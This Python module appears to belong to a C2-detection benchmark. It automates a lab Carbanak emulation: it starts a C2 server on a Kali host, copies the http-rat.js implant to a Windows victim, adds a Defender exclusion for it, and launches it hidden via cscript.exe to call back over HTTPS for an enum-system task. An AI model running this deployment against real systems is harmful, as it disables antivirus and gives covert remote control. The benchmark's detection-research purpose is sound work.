r"""Carbanak phase runners for bench_v4 AEL-CARBANAK-RAT-001.

These runners implement the same callable contract as the Sliver and
Meterpreter runners, but drive a Carbanak HTTPS script-RAT hosted by
cscript.exe instead of a standalone EXE implant.

C2 architecture:
  - c2server (Carbon-ACK Go binary) on Kali, HTTPS port 18448
  - http-rat.js implant run via cscript.exe on Windows victim
  - Windows cscript -> Kali Carbon-ACK (outbound HTTPS POST)

Key design difference from Sliver/Meterpreter:
  - The implant IS a .js script run by cscript.exe
  - ExecutablePath = C:\Windows\System32\cscript.exe (protected system file)
  - Payload path = C:\Users\Public\c2t_<run_id>.js
  - freeze_target_identity uses match_command_line=True to bind by CommandLine
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import time
from datetime import datetime, timezone
from typing import Any, Callable, Mapping

from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (
    CalderaBootstrapPhaseResult,
    CalderaScenarioPhaseResult,
    CalderaTargetCandidate,
    BenchV4RuntimeError,
    RuntimeCase,
    RuntimeValues,
    deterministic_runtime_source_id,
    verify_deployment_manifest,
)
from .runtime import find_driver_agent

__all__ = [
    "run_carbanak_bootstrap_phase",
    "resolve_carbanak_target_phase",
    "run_carbanak_scenario_phase",
]

KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
C2SERVER_BINARY = os.environ.get(
    "C2TRACE_CARBAKAN_SERVER", "/tmp/c2trace-carbanak/c2server/c2server"
)
C2SERVER_PORT = 18448
HTTP_RAT_SOURCE = os.environ.get(
    "C2TRACE_HTTP_RAT_SOURCE",
    os.path.join(
        os.path.dirname(__file__), "..", "..", "..",
        "experiments", "c2trace_public_tool_benchmark_v1", "upstream",
        "AEL-CARBANAK-RAT-001", "source", "Enterprise", "carbanak",
        "Resources", "step1", "http-rat.js",
    ),
)


def _ssh_run_py(script: str, timeout: float = 120) -> str:
    """Run a Python script on Kali via SSH, return stdout."""
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(
            f"SSH python failed (rc={result.returncode}): {result.stderr}"
        )
    return result.stdout


def _ssh_run(cmd_str: str, timeout: float = 60) -> str:
    """Run a shell command on Kali via SSH, return stdout."""
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, cmd_str]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(
            f"SSH command failed (rc={result.returncode}): {result.stderr}"
        )
    return result.stdout


def _copy_implant_to_windows(victim_path: str) -> str:
    """Copy http-rat.js from the local source tree to the Windows victim path."""
    if not os.path.isfile(HTTP_RAT_SOURCE):
        raise BenchV4RuntimeError(f"http-rat.js source not found: {HTTP_RAT_SOURCE}")
    import shutil
    shutil.copy2(HTTP_RAT_SOURCE, victim_path)
    if not os.path.isfile(victim_path):
        raise BenchV4RuntimeError(f"failed to copy http-rat.js to {victim_path}")
    return victim_path


def _add_defender_exclusion(path: str) -> None:
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _execute_implant(path: str, c2_url: str) -> int:
    """Start cscript.exe with the http-rat.js script, return PID."""
    ps = (
        f"$p = Start-Process -FilePath 'cscript.exe' "
        f"-ArgumentList '//B //NoLogo','{path}','{c2_url}' "
        f"-PassThru -WindowStyle Hidden; Write-Output $p.Id"
    )
    result = subprocess.run(
        ["powershell", "-Command", ps],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"cscript execution failed: {result.stderr}")
    lines = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if lines and lines[-1].isdigit():
        return int(lines[-1])
    raise BenchV4RuntimeError(f"could not parse cscript PID from: {result.stdout}")


def _start_c2server() -> None:
    """Start the Carbanak c2server on Kali via SSH (idempotent)."""
    # Check if already running
    check = _ssh_run_py(
        "import subprocess; r = subprocess.run("
        "['pgrep', '-f', 'c2server.*18448'], capture_output=True, text=True); "
        "print(r.stdout.strip())",
        timeout=15,
    )
    if check.strip():
        return  # already running
    # Start c2server via Python Popen with start_new_session for proper daemonization
    _ssh_run_py(
        "import subprocess, os, time\n"
        "proc = subprocess.Popen(\n"
        "    ['./c2server', '-lhost', '0.0.0.0:18448', '-ssl'],\n"
        "    cwd='/tmp/c2trace-carbanak/c2server',\n"
        "    stdout=open('/tmp/c2trace-carbanak/c2server.log', 'w'),\n"
        "    stderr=subprocess.STDOUT,\n"
        "    stdin=subprocess.DEVNULL,\n"
        "    start_new_session=True,\n"
        ")\n"
        "time.sleep(3)\n"
        "r = subprocess.run(['pgrep', '-f', 'c2server.*18448'], capture_output=True, text=True)\n"
        "print('RUNNING:', r.stdout.strip())\n",
        timeout=30,
    )
    # Verify it started
    check2 = _ssh_run_py(
        "import subprocess; r = subprocess.run("
        "['pgrep', '-f', 'c2server.*18448'], capture_output=True, text=True); "
        "print(r.stdout.strip())",
        timeout=15,
    )
    if not check2.strip():
        log = _ssh_run_py(
            "try:\n"
            "    print(open('/tmp/c2trace-carbanak/c2server.log').read())\n"
            "except Exception as e:\n"
            "    print('NOLOG:', e)",
            timeout=15,
        )
        raise BenchV4RuntimeError(f"c2server failed to start. Log: {log}")


def _wait_for_callback(timeout: float = 120, poll: float = 3.0) -> bool:
    """Wait for the http-rat.js implant to register with the c2server."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        log = _ssh_run_py(
            "try:\n"
            "    print(open('/tmp/c2trace-carbanak/c2server.log').read())\n"
            "except Exception:\n"
            "    print('')",
            timeout=15,
        )
        if "New session" in log or "Listening" in log:
            return True
        time.sleep(poll)
    return False


def _synthetic_operation(run_id: str, role: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}",
        "name": f"AEL-CARBANAK-RAT-001 {role} ({run_id})",
        "state": "finished",
        "platform": "windows" if role == "bootstrap" else "linux",
        "group": "c2t-control" if role == "bootstrap" else "c2t-driver",
        "start": datetime.now(timezone.utc).isoformat(),
        "finish": "",
        "autonomous": 0,
    }


def _synthetic_link(run_id: str, role: str, ability_id: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}-link",
        "ability": {"ability_id": ability_id},
        "status": 0,
        "command": "carbanak_deploy" if role == "bootstrap" else "carbanak_enum_system",
        "host": "DESKTOP-G9IIQ2P",
        "pid": None,
    }


def run_carbanak_bootstrap_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaBootstrapPhaseResult:
    """Deploy one Carbanak http-rat.js implant and return a synthetic Bootstrap result."""
    if event_sink:
        event_sink("carbanak_bootstrap_start", {"run_id": values.run_id})

    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)

    # Start c2server on Kali
    _start_c2server()

    # Copy http-rat.js to Windows victim
    implant_path = values.target_path
    _copy_implant_to_windows(implant_path)
    _add_defender_exclusion(implant_path)

    # Start cscript.exe with the http-rat.js script
    c2_url = f"https://{KALI_IP}:{C2SERVER_PORT}/"
    cscript_pid = _execute_implant(implant_path, c2_url)

    # Wait for the implant to call back to the c2server
    time.sleep(5)
    callback_ok = _wait_for_callback(
        timeout=operation_timeout, poll=poll_seconds,
    )
    if not callback_ok:
        raise BenchV4RuntimeError("Carbanak implant did not call back to c2server")

    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)

    if event_sink:
        event_sink("carbanak_bootstrap_complete", {
            "implant_path": implant_path,
            "cscript_pid": cscript_pid,
            "c2_url": c2_url,
        })

    return CalderaBootstrapPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=verified.manifest_sha256,
        runtime_source_id=runtime_source_id,
        install_receipt={"synthetic": True, "implant_path": implant_path, "cscript_pid": cscript_pid},
        runtime_source={"id": runtime_source_id, "name": "c2trace_carbanak_runtime_source"},
        control_agent=dict(control),
        driver_agent=dict(driver) if driver else None,
        baseline_paws=baseline_paws,
        started_at_utc=started,
        bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"),
        bootstrap_links=(bootstrap_link,),
        bootstrap_report={"state": "finished", "outcome": "implant_deployed"},
        bootstrap_event_logs=(),
    )


def resolve_carbanak_target_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    *,
    timeout_seconds: float = 360.0,
    poll_seconds: float = 3.0,
) -> CalderaTargetCandidate:
    """Find the cscript.exe process and HTTPS connection for the deployed implant."""
    # The cscript PID was captured during bootstrap
    cscript_pid = 0
    receipt = bootstrap.install_receipt
    if isinstance(receipt, Mapping):
        cscript_pid = int(receipt.get("cscript_pid") or 0)

    raw_identity = {
        "pid": cscript_pid,
        "path": values.target_path,
        "host": "DESKTOP-G9IIQ2P",
        "c2_url": f"https://{KALI_IP}:{C2SERVER_PORT}/",
    }

    return CalderaTargetCandidate(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        raw_identity=raw_identity,
        scenario_paw=agent_paw(bootstrap.control_agent),
    )


def _write_tasking(task: str) -> None:
    """Write a task to tasking.html in the c2server working directory on Kali."""
    _ssh_run_py(
        "open('/tmp/c2trace-carbanak/c2server/tasking.html', 'w').write('" + task + "')",
        timeout=15,
    )


def _wait_for_output(timeout: float = 120, poll: float = 3.0) -> bool:
    """Wait for the c2server to report task output."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        log = _ssh_run_py(
            "try:\n"
            "    print(open('/tmp/c2trace-carbanak/c2server.log').read())\n"
            "except Exception:\n"
            "    print('')",
            timeout=15,
        )
        if "Task Output" in log or "Agent received tasking" in log or "tasking" in log.lower():
            return True
        time.sleep(poll)
    return False


def run_carbanak_scenario_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    candidate: CalderaTargetCandidate,
    frozen_identity: Mapping[str, Any],
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaScenarioPhaseResult:
    """Issue one ENUM_SYSTEM task via the Carbanak C2 channel."""
    if event_sink:
        event_sink("carbanak_scenario_start", {
            "cscript_pid": candidate.raw_identity.get("pid"),
        })

    # Write enum-system tasking
    _write_tasking("enum-system")

    # Wait for the task to be picked up and output received
    time.sleep(5)
    output_ok = _wait_for_output(
        timeout=operation_timeout, poll=poll_seconds,
    )
    if not output_ok:
        raise BenchV4RuntimeError("Carbanak enum-system task output not received")

    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)

    if event_sink:
        event_sink("carbanak_scenario_complete", {"outcome": "enum_system_completed"})

    return CalderaScenarioPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        target_identity=dict(frozen_identity),
        scenario_operation=_synthetic_operation(values.run_id, "scenario"),
        scenario_links=(scenario_link,),
        scenario_report={"state": "finished", "outcome": "enum_system_completed"},
        scenario_event_logs=(),
    )
